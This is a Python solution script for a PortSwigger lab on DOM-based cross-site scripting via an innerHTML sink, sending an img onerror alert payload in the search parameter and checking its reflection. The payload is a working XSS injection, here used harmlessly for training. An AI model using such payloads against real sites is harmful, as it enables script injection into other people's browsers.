# Lab 04 — DOM XSS in innerHTML sink using source location.search
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
#
# Vulnerability: Search functionality — client-side JS
# Aim:           Perform DOM-based XSS that calls alert
#
# Technique:
#   The page JS assigns location.search to element.innerHTML:
#     document.getElementById('searchMessage').innerHTML = query;
#
#   innerHTML silently drops <script> tags — use an event-handler tag instead:
#     <img src=x onerror=alert(1)>
#   src=x fails to load → onerror fires → alert executes.
#
# ⚠  DOM XSS: execution is client-side only. We verify raw reflection here.
#
# Usage: python xss_lab04.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "<img src=x onerror=alert(1)>"

if __name__ == "__main__":
    banner()
    section("LAB 04 — DOM XSS: innerHTML SINK / location.search SOURCE")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "DOM XSS payload")

    print()
    print("  ➜  Open this URL in a browser to trigger JS execution:")
    print(f"     {r.url}")
    print("  ℹ  innerHTML blocks <script> but not event handlers — onerror fires.")
